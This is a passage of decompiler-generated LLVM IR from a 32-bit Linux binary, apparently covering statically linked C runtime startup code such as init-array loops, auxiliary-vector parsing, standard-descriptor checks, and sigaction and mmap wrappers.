  uselistorder i32 1024, { 0, 9, 10, 6, 11, 7, 12, 8, 13, 14, 5, 15, 16, 4, 17, 18, 3, 19, 2, 20, 1, 21, 22 }
  uselistorder i32 2048, { 0, 3, 4, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804e358, { 2, 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 3, 1, 2 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 97, { 3, 2, 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 84, { 1, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 64, { 1, 2, 0 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 51, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 46, { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder i32 34, { 3, 4, 5, 6, 2, 0, 1 }
  uselistorder i32 31, { 3, 2, 5, 6, 7, 8, 0, 1, 4, 9 }
  uselistorder i32 30, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 24, { 15, 16, 21, 17, 22, 14, 11, 9, 18, 10, 7, 19, 8, 5, 20, 6, 4, 2, 3, 12, 0, 1, 13 }
  uselistorder i32 22, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 20, { 1, 3, 5, 4, 6, 17, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 2 }
  uselistorder i32 19, { 1, 0 }
  uselistorder i32 15, { 1, 4, 3, 0, 2 }
  uselistorder i32 13, { 1, 0 }
  uselistorder i32 11, { 1, 2, 0 }
  uselistorder i32 9, { 1, 4, 3, 0, 5, 2 }
  uselistorder i32 7, { 2, 0, 1 }
  uselistorder i32 6, { 0, 4, 2, 3, 1, 6, 5 }
  uselistorder i32 5, { 4, 1, 2, 5, 3, 6, 7, 0 }
  uselistorder label %dec_label_pc_8051299, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805126c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051242, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80511bf, { 1, 0 }
  uselistorder label %dec_label_pc_80511ad, { 1, 0 }
}

define i32 @function_80512a0() local_unnamed_addr {
dec_label_pc_80512a0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80512a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80512a0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32 0), label %dec_label_pc_80512b4, label %dec_label_pc_80512c1

dec_label_pc_80512b4:                             ; preds = %dec_label_pc_80512a0, %dec_label_pc_80512b4
  %v1_80512bb8 = phi i32 [ %v1_80512bb, %dec_label_pc_80512b4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32 -1), %dec_label_pc_80512a0 ]
  store i32 ptrtoint (i32* @global_var_80512bb.90 to i32), i32* %stack_var_-16, align 4
  %v5_80512b4 = mul i32 %v1_80512bb8, 4
  %v6_80512b4 = add i32 %v5_80512b4, ptrtoint (i32* @global_var_80555e0.89 to i32)
  %v7_80512b4 = inttoptr i32 %v6_80512b4 to i32*
  %v8_80512b4 = load i32, i32* %v7_80512b4, align 4
  call void @__pseudo_call(i32 %v8_80512b4)
  %v0_80512bb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80512bb = add i32 %v0_80512bb.pre, -1
  store i32 %v1_80512bb, i32* %ebx.global-to-local, align 4
  %v10_80512bc = icmp eq i32 %v0_80512bb.pre, 0
  %v1_80512bf = icmp eq i1 %v10_80512bc, false
  br i1 %v1_80512bf, label %dec_label_pc_80512b4, label %dec_label_pc_80512c1

dec_label_pc_80512c1:                             ; preds = %dec_label_pc_80512b4, %dec_label_pc_80512a0
  %v0_80512c1 = load i32, i32* @global_var_805b968.91, align 8
  %v1_80512c6 = icmp eq i32 %v0_80512c1, 0
  br i1 %v1_80512c6, label %dec_label_pc_80512cc, label %dec_label_pc_80512ca

dec_label_pc_80512ca:                             ; preds = %dec_label_pc_80512c1
  %v0_80512ca = load i32, i32* %stack_var_-16, align 4
  %v1_80512ca = call i32 @unknown_0(i32 %v0_80512ca)
  br label %dec_label_pc_80512cc

dec_label_pc_80512cc:                             ; preds = %dec_label_pc_80512ca, %dec_label_pc_80512c1
  %v0_80512cc = load i32, i32* @global_var_805b96c.92, align 4
  %v1_80512d2 = icmp eq i32 %v0_80512cc, 0
  br i1 %v1_80512d2, label %dec_label_pc_80512db, label %dec_label_pc_80512d6

dec_label_pc_80512d6:                             ; preds = %dec_label_pc_80512cc
  %v2_80512d6 = load i32, i32* %stack_var_-16, align 4
  %v1_80512d9 = call i32 @unknown_0(i32 %v2_80512d6)
  br label %dec_label_pc_80512db

dec_label_pc_80512db:                             ; preds = %dec_label_pc_80512d6, %dec_label_pc_80512cc
  %v2_80512db = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_80512db

; uselistorder directives
  uselistorder i32 %v1_80512bb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80512b4, { 1, 0 }
}

define i32 @function_80512df(i32 %arg1) local_unnamed_addr {
dec_label_pc_80512df:
  ret i32 0
}

define i32 @function_80512e2(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80512e2:
  %v0_80512e2 = load i32, i32* @eax, align 4
  ret i32 %v0_80512e2
}

define i32 @function_80512e3() local_unnamed_addr {
dec_label_pc_80512e3:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80512e3 = load i32, i32* @esi, align 4
  %v0_80512e4 = load i32, i32* @eax, align 4
  store i32 %v0_80512e4, i32* @esi, align 4
  %v0_80512e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80512e6, i32* %stack_var_-8, align 4
  %v0_80512e7 = load i32, i32* @edx, align 4
  store i32 %v0_80512e7, i32* @ebx, align 4
  %v4_80512ef = call i32 @function_804e1dc(i32 %v0_80512e4, i32 1, i32 %tmp6)
  %v8_80512f7 = icmp eq i32 %v4_80512ef, -1
  %v1_80512f8 = icmp eq i1 %v8_80512f7, false
  br i1 %v1_80512f8, label %dec_label_pc_8051313, label %dec_label_pc_80512fa

dec_label_pc_80512fa:                             ; preds = %dec_label_pc_80512e3
  %v0_80512fc = load i32, i32* @ebx, align 4
  %v5_8051302 = call i32 @function_804e450(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054500.93, i32 0, i32 0), i32 %v0_80512fc)
  %v1_805130a = load i32, i32* @esi, align 4
  %v12_805130a = icmp eq i32 %v5_8051302, %v1_805130a
  br i1 %v12_805130a, label %dec_label_pc_8051313, label %dec_label_pc_805130e

dec_label_pc_805130e:                             ; preds = %dec_label_pc_80512fa
  %v0_805130e = call i32 @function_805090c()
  br label %dec_label_pc_8051313

dec_label_pc_8051313:                             ; preds = %dec_label_pc_80512fa, %dec_label_pc_80512e3, %dec_label_pc_805130e
  %v2_8051313 = load i32, i32* %stack_var_-12, align 4
  %v2_8051314 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051314, i32* @ebx, align 4
  store i32 %v0_80512e3, i32* @esi, align 4
  ret i32 %v2_8051313

; uselistorder directives
  uselistorder i32 ()* @function_805090c, { 0, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_804e450, { 3, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804e1dc, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051313, { 2, 0, 1 }
}

define i32 @function_8051317() local_unnamed_addr {
dec_label_pc_8051317:
  %v0_805131a = load i8, i8* @global_var_805b970.94, align 16
  %v1_805131a = icmp eq i8 %v0_805131a, 0
  %v1_8051321 = icmp eq i1 %v1_805131a, false
  br i1 %v1_8051321, label %dec_label_pc_8051317.dec_label_pc_8051353_crit_edge, label %dec_label_pc_8051323

dec_label_pc_8051317.dec_label_pc_8051353_crit_edge: ; preds = %dec_label_pc_8051317
  %v0_8051356.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051353

dec_label_pc_8051323:                             ; preds = %dec_label_pc_8051317
  store i8 1, i8* @global_var_805b970.94, align 16
  store i32 4096, i32* @global_var_805b964.95, align 4
  %v0_805134e = call i32 @function_804e738()
  br label %dec_label_pc_8051353

dec_label_pc_8051353:                             ; preds = %dec_label_pc_8051317.dec_label_pc_8051353_crit_edge, %dec_label_pc_8051323
  %v0_8051356 = phi i32 [ %v0_8051356.pre, %dec_label_pc_8051317.dec_label_pc_8051353_crit_edge ], [ %v0_805134e, %dec_label_pc_8051323 ]
  ret i32 %v0_8051356

; uselistorder directives
  uselistorder i8 1, { 27, 2, 0, 26, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 25, 3 }
  uselistorder i8* @global_var_805b970.94, { 1, 0 }
  uselistorder label %dec_label_pc_8051353, { 1, 0 }
}

define i32 @function_8051357(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051357:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp43, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805b95c.96, align 4
  store i32 %arg6, i32* @global_var_805b96c.92, align 4
  %v2_805138e = mul i32 %arg2, 4
  %v3_805138e = add i32 %tmp43, %v2_805138e
  %v1_8051391 = add i32 %v3_805138e, 4
  store i32 %v1_8051391, i32* %edx.global-to-local, align 4
  store i32 %v1_8051391, i32* @global_var_805b960.87, align 32
  %v3_805139a = load i32, i32* %arg3, align 4
  %v14_805139a = icmp eq i32 %v1_8051391, %v3_805139a
  store i32 0, i32* %stack_var_-168, align 4
  %v1_80513a0 = icmp eq i1 %v14_805139a, false
  %v4_80513a0 = select i1 %v1_80513a0, i32 %v1_8051391, i32 %v3_805138e
  store i32 %v4_80513a0, i32* @global_var_805b960.87, align 32
  %v2_80513a8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80513ad = bitcast i32* %stack_var_-136 to i8*
  %v4_80513ad = call i32 @function_804f698(i8* %v3_80513ad, i32 0, i32 120)
  %v0_80513b2 = load i32, i32* @global_var_805b960.87, align 32
  br label %dec_label_pc_80513ba

dec_label_pc_80513ba:                             ; preds = %dec_label_pc_80513ba, %dec_label_pc_8051357
  %v0_80513ba = phi i32 [ %v1_80513bd, %dec_label_pc_80513ba ], [ %v0_80513b2, %dec_label_pc_8051357 ]
  %v1_80513ba = inttoptr i32 %v0_80513ba to i32*
  %v2_80513ba = load i32, i32* %v1_80513ba, align 4
  %v3_80513ba = icmp eq i32 %v2_80513ba, 0
  %v1_80513bd = add i32 %v0_80513ba, 4
  %v1_80513c0 = icmp eq i1 %v3_80513ba, false
  br i1 %v1_80513c0, label %dec_label_pc_80513ba, label %dec_label_pc_80513e1.preheader

dec_label_pc_80513e1.preheader:                   ; preds = %dec_label_pc_80513ba
  store i32 %v1_80513bd, i32* @ebx, align 4
  %v1_80513e122 = inttoptr i32 %v1_80513bd to i32*
  %v2_80513e123 = load i32, i32* %v1_80513e122, align 4
  %v3_80513e124 = icmp eq i32 %v2_80513e123, 0
  %v1_80513e426 = icmp eq i1 %v3_80513e124, false
  br i1 %v1_80513e426, label %dec_label_pc_80513c6.lr.ph, label %dec_label_pc_80513e6

dec_label_pc_80513c6.lr.ph:                       ; preds = %dec_label_pc_80513e1.preheader
  %v3_805139e = ptrtoint i32* %stack_var_-168 to i32
  %v3_80513d1 = add i32 %v3_805139e, 32
  br label %dec_label_pc_80513c6

dec_label_pc_80513c6:                             ; preds = %dec_label_pc_80513c6.lr.ph, %dec_label_pc_80513de
  %v1_80513d1 = phi i32 [ %v2_80513e123, %dec_label_pc_80513c6.lr.ph ], [ %v2_80513e1, %dec_label_pc_80513de ]
  %v0_80513d0 = phi i32 [ %v1_80513bd, %dec_label_pc_80513c6.lr.ph ], [ %v1_80513de, %dec_label_pc_80513de ]
  %v6_80513cb = icmp ugt i32 %v1_80513d1, 14
  br i1 %v6_80513cb, label %dec_label_pc_80513de, label %dec_label_pc_80513cd

dec_label_pc_80513cd:                             ; preds = %dec_label_pc_80513c6
  %v0_80513cd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80513cd, i32* %stack_var_-160, align 4
  store i32 %v0_80513d0, i32* %stack_var_-168, align 4
  %v2_80513d1 = mul i32 %v1_80513d1, 8
  %v4_80513d1 = add i32 %v3_80513d1, %v2_80513d1
  %v3_80513d6 = inttoptr i32 %v4_80513d1 to i16*
  %v4_80513d6 = call i32 @function_804f670(i16* %v3_80513d6, i32 %v0_80513d0, i32 8)
  %v0_80513de.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80513de

dec_label_pc_80513de:                             ; preds = %dec_label_pc_80513c6, %dec_label_pc_80513cd
  %v0_80513de = phi i32 [ %v0_80513d0, %dec_label_pc_80513c6 ], [ %v0_80513de.pre, %dec_label_pc_80513cd ]
  %v1_80513de = add i32 %v0_80513de, 8
  store i32 %v1_80513de, i32* @ebx, align 4
  %v1_80513e1 = inttoptr i32 %v1_80513de to i32*
  %v2_80513e1 = load i32, i32* %v1_80513e1, align 4
  %v3_80513e1 = icmp eq i32 %v2_80513e1, 0
  %v1_80513e4 = icmp eq i1 %v3_80513e1, false
  br i1 %v1_80513e4, label %dec_label_pc_80513c6, label %dec_label_pc_80513e6

dec_label_pc_80513e6:                             ; preds = %dec_label_pc_80513de, %dec_label_pc_80513e1.preheader
  store i32 %v2_80513a8, i32* @eax, align 4
  %v0_80513ea = call i32 @function_80524f8()
  store i32 %v0_80513ea, i32* @eax, align 4
  %v0_80513ef = call i32 @function_8051317()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_80513fd = icmp eq i32 %tmp38, 0
  %v3_80513ff = select i1 %v1_80513fd, i32 4096, i32 %tmp38
  %v13_8051402 = icmp eq i32 %tmp37, -1
  store i32 %v3_80513ff, i32* @global_var_805b964.95, align 4
  %v1_805140c = icmp eq i1 %v13_8051402, false
  br i1 %v1_805140c, label %dec_label_pc_8051437, label %dec_label_pc_805140e

dec_label_pc_805140e:                             ; preds = %dec_label_pc_80513e6
  %v0_805140e = call i32 @function_805179c()
  store i32 %v0_805140e, i32* @ebx, align 4
  %v0_8051415 = call i32 @function_8051738()
  %v0_805141a = load i32, i32* @ebx, align 4
  %v12_805141a = icmp eq i32 %v0_805141a, %v0_8051415
  %v1_805141c = icmp eq i1 %v12_805141a, false
  br i1 %v1_805141c, label %dec_label_pc_805144d, label %dec_label_pc_805141e

dec_label_pc_805141e:                             ; preds = %dec_label_pc_805140e
  %v0_805141e = call i32 @function_8051760()
  store i32 %v0_805141e, i32* @ebx, align 4
  %v0_8051425 = call i32 @function_8051710()
  %v0_805142a = load i32, i32* @ebx, align 4
  %v12_805142a = icmp eq i32 %v0_805142a, %v0_8051425
  %v1_805142c = icmp eq i1 %v12_805142a, false
  br i1 %v1_805142c, label %dec_label_pc_805144d, label %dec_label_pc_805142e.thread

dec_label_pc_805142e.thread:                      ; preds = %dec_label_pc_805141e
  br label %dec_label_pc_8051477

dec_label_pc_8051437:                             ; preds = %dec_label_pc_80513e6
  %v15_8051437 = icmp eq i32 %tmp37, %tmp36
  %v1_805143b = icmp eq i1 %v15_8051437, false
  br i1 %v1_805143b, label %dec_label_pc_805144d, label %dec_label_pc_805143d

dec_label_pc_805143d:                             ; preds = %dec_label_pc_8051437
  br label %dec_label_pc_805144d

dec_label_pc_805144d:                             ; preds = %dec_label_pc_805143d, %dec_label_pc_8051437, %dec_label_pc_805141e, %dec_label_pc_805140e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051454 = call i32 @function_80512e3()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051463 = call i32 @function_80512e3()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051472 = call i32 @function_80512e3()
  br label %dec_label_pc_8051477

dec_label_pc_8051477:                             ; preds = %dec_label_pc_805142e.thread, %dec_label_pc_805144d
  %v0_8051477 = load i32, i32* @edi, align 4
  %v1_8051477 = inttoptr i32 %v0_8051477 to i32*
  %v2_8051477 = load i32, i32* %v1_8051477, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8051477, i32* bitcast (i32** @global_var_80558d8.98 to i32*), align 8
  store i32 %arg5, i32* @global_var_805b968.91, align 8
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32 0), label %dec_label_pc_805149c, label %dec_label_pc_80514cc.critedge

dec_label_pc_805149c:                             ; preds = %dec_label_pc_8051477, %dec_label_pc_805149c
  %v4_805149c = phi i32 [ %v1_80514a3, %dec_label_pc_805149c ], [ 0, %dec_label_pc_8051477 ]
  store i32 ptrtoint (i32* @global_var_80514a3.99 to i32), i32* %stack_var_-160, align 4
  %v5_805149c = mul i32 %v4_805149c, 4
  %v6_805149c = add i32 %v5_805149c, ptrtoint (i32* @global_var_80555e0.89 to i32)
  %v7_805149c = inttoptr i32 %v6_805149c to i32*
  %v8_805149c = load i32, i32* %v7_805149c, align 4
  call void @__pseudo_call(i32 %v8_805149c)
  %v0_80514a3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514a3 = add i32 %v0_80514a3, 1
  store i32 %v1_80514a3, i32* %ebx.global-to-local, align 4
  %v1_80514a4 = load i32, i32* %esi.global-to-local, align 4
  %v7_80514a4 = icmp ult i32 %v1_80514a3, %v1_80514a4
  br i1 %v7_80514a4, label %dec_label_pc_805149c, label %dec_label_pc_80514a8

dec_label_pc_80514a8:                             ; preds = %dec_label_pc_805149c
  store i32 134550702, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32 0), label %dec_label_pc_80514c0, label %dec_label_pc_80514cc

dec_label_pc_80514c0:                             ; preds = %dec_label_pc_80514a8, %dec_label_pc_80514c0
  %v4_80514c0 = phi i32 [ %v1_80514c7, %dec_label_pc_80514c0 ], [ 0, %dec_label_pc_80514a8 ]
  store i32 ptrtoint (i32* @global_var_80514c7.100 to i32), i32* %stack_var_-160, align 4
  %v5_80514c0 = mul i32 %v4_80514c0, 4
  %v6_80514c0 = add i32 %v5_80514c0, ptrtoint (i32* @global_var_80555e0.89 to i32)
  %v7_80514c0 = inttoptr i32 %v6_80514c0 to i32*
  %v8_80514c0 = load i32, i32* %v7_80514c0, align 4
  call void @__pseudo_call(i32 %v8_80514c0)
  %v0_80514c7 = load i32, i32* @ebx, align 4
  %v1_80514c7 = add i32 %v0_80514c7, 1
  store i32 %v1_80514c7, i32* @ebx, align 4
  %v1_80514c8 = load i32, i32* %esi.global-to-local, align 4
  %v7_80514c8 = icmp ult i32 %v1_80514c7, %v1_80514c8
  br i1 %v7_80514c8, label %dec_label_pc_80514c0, label %dec_label_pc_80514cc

dec_label_pc_80514cc.critedge:                    ; preds = %dec_label_pc_8051477
  store i32 134550702, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514cc

dec_label_pc_80514cc:                             ; preds = %dec_label_pc_80514c0, %dec_label_pc_80514cc.critedge, %dec_label_pc_80514a8
  %v0_80514d5 = load i32, i32* %stack_var_-160, align 4
  %v1_80514d5 = call i32 @function_804e694(i32 %v0_80514d5)
  %v1_80514da = inttoptr i32 %v1_80514d5 to i32*
  store i32 0, i32* %v1_80514da, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_80514fb = load i32, i32* @edi, align 4
  store i32 %v0_80514fb, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_805150a = load i32, i32* @eax, align 4
  %v1_805150d = call i32 @function_8050ef8(i32 %v0_805150a)
  %v0_8051519 = load i32, i32* @ebx, align 4
  %v1_8051519 = inttoptr i32 %v0_8051519 to %sigcontext*
  %v2_8051519 = call i32 @sigreturn(%sigcontext* %v1_8051519)
  %v0_8051521 = load i32, i32* @ebx, align 4
  %v1_8051521 = inttoptr i32 %v0_8051521 to %sigcontext*
  %v2_8051521 = call i32 @sigreturn(%sigcontext* %v1_8051521)
  ret i32 %v2_8051521

; uselistorder directives
  uselistorder i32 %v1_80514c7, { 1, 2, 0 }
  uselistorder i32 %v1_80514a3, { 1, 2, 0 }
  uselistorder i32 %v2_80513e1, { 1, 0 }
  uselistorder i32 %v1_80513de, { 2, 1, 0 }
  uselistorder i32 %v1_80513bd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80513ba, { 1, 0 }
  uselistorder i32 %v1_8051391, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-160, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.89 to i32), i32 -134567392), i32 2), { 0, 4, 2, 5, 3, 1 }
  uselistorder i32 ()* @function_80512e3, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 32, { 33, 17, 28, 1, 0, 2, 3, 26, 4, 5, 29, 6, 7, 8, 31, 32, 30, 10, 9, 19, 20, 27, 21, 11, 12, 14, 13, 22, 24, 16, 15, 23, 25, 18 }
  uselistorder i32 (i8*, i32, i32)* @function_804f698, { 15, 13, 12, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_80514cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80514c0, { 1, 0 }
  uselistorder label %dec_label_pc_805149c, { 1, 0 }
  uselistorder label %dec_label_pc_8051477, { 1, 0 }
  uselistorder label %dec_label_pc_80513de, { 1, 0 }
  uselistorder label %dec_label_pc_80513c6, { 1, 0 }
}

define i32 @function_8051523(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051523:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051523 = load i32, i32* @esi, align 4
  %v0_8051524 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051539 = icmp eq i32* %arg2, null
  br i1 %v1_8051539, label %dec_label_pc_805158d, label %dec_label_pc_805153d

dec_label_pc_805153d:                             ; preds = %dec_label_pc_8051523
  %v2_805153d = load i32, i32* %arg2, align 4
  store i32 %v2_805153d, i32* %stack_var_-148, align 4
  %v1_8051546 = add i32 %tmp11, 4
  %v3_8051558 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051558 = call i32 @function_804f670(i16* %v3_8051558, i32 %v1_8051546, i32 128)
  br label %dec_label_pc_805158d

dec_label_pc_805158d:                             ; preds = %dec_label_pc_8051523, %dec_label_pc_805153d
  %v1_805158f = icmp eq i32 %arg3, 0
  br i1 %v1_805158f, label %dec_label_pc_8051597, label %dec_label_pc_8051593

dec_label_pc_8051593:                             ; preds = %dec_label_pc_805158d
  %v2_8051593 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051597

dec_label_pc_8051597:                             ; preds = %dec_label_pc_805158d, %dec_label_pc_8051593
  %v0_80515a6 = phi i32 [ 0, %dec_label_pc_805158d ], [ %v2_8051593, %dec_label_pc_8051593 ]
  br i1 %v1_8051539, label %dec_label_pc_80515a4, label %dec_label_pc_805159d

dec_label_pc_805159d:                             ; preds = %dec_label_pc_8051597
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80515a4

dec_label_pc_80515a4:                             ; preds = %dec_label_pc_8051597, %dec_label_pc_805159d
  %v0_80515a7 = phi %sigaction* [ null, %dec_label_pc_8051597 ], [ %phitmp, %dec_label_pc_805159d ]
  %v5_80515af = call i32 @function_8051668(i32 %arg1, %sigaction* %v0_80515a7, i32 %v0_80515a6, i32 8)
  store i32 %v5_80515af, i32* %ebx.global-to-local, align 4
  br i1 %v1_805158f, label %dec_label_pc_80515f2, label %dec_label_pc_80515bd

dec_label_pc_80515bd:                             ; preds = %dec_label_pc_80515a4
  %v2_80515bd = icmp slt i32 %v5_80515af, 0
  br i1 %v2_80515bd, label %dec_label_pc_80515f2, label %dec_label_pc_80515c1

dec_label_pc_80515c1:                             ; preds = %dec_label_pc_80515bd
  %v3_80515c1 = load i32, i32* %stack_var_-288, align 4
  %v2_80515c5 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80515c1, i32* %v2_80515c5, align 4
  %v2_80515cd = ptrtoint i32* %stack_var_-276 to i32
  %v1_80515d2 = add i32 %arg3, 4
  %v3_80515d6 = inttoptr i32 %v1_80515d2 to i16*
  %v4_80515d6 = call i32 @function_804f670(i16* %v3_80515d6, i32 %v2_80515cd, i32 128)
  %v2_80515df = add i32 %arg3, 132
  %v3_80515df = inttoptr i32 %v2_80515df to i32*
  %v2_80515ec = add i32 %arg3, 136
  %v3_80515ec = inttoptr i32 %v2_80515ec to i32*
  %v0_80515f8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515f2

dec_label_pc_80515f2:                             ; preds = %dec_label_pc_80515bd, %dec_label_pc_80515a4, %dec_label_pc_80515c1
  %v0_80515f8 = phi i32 [ %v5_80515af, %dec_label_pc_80515bd ], [ %v5_80515af, %dec_label_pc_80515a4 ], [ %v0_80515f8.pre, %dec_label_pc_80515c1 ]
  store i32 %v0_8051524, i32* @ebx, align 4
  store i32 %v0_8051523, i32* @esi, align 4
  ret i32 %v0_80515f8

; uselistorder directives
  uselistorder i32 128, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80515f2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515a4, { 1, 0 }
  uselistorder label %dec_label_pc_8051597, { 1, 0 }
  uselistorder label %dec_label_pc_805158d, { 1, 0 }
}

define i32 @function_8051600() local_unnamed_addr {
dec_label_pc_8051600:
  %v0_8051603 = load i32, i32* @eax, align 4
  %v1_8051605 = sub i32 0, %v0_8051603
  %v1_8051607 = call i32 @function_804e694(i32 ptrtoint (i32* @0 to i32))
  %v2_805160c = inttoptr i32 %v1_8051607 to i32*
  store i32 %v1_8051605, i32* %v2_805160c, align 4
  ret i32 -1
}

define i32 @function_8051618(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051618:
  %stack_var_4 = alloca i32, align 4
  %v0_8051618 = load i32, i32* @ebx, align 4
  %v2_8051623 = load i32, i32* @ecx, align 4
  %v4_8051623 = load i32, i32* @esi, align 4
  %v5_8051623 = load i32, i32* @edi, align 4
  %v6_8051623 = load i32, i32* @ebp, align 4
  %v7_8051623 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8051623, i32 %v0_8051618, i32 %v4_8051623, i32 %v5_8051623, i32 %v6_8051623)
  %v8_8051623 = ptrtoint i32* %v7_8051623 to i32
  store i32 %v0_8051618, i32* @ebx, align 4
  %v3_805162c = icmp ugt i32* %v7_8051623, inttoptr (i32 -4096 to i32*)
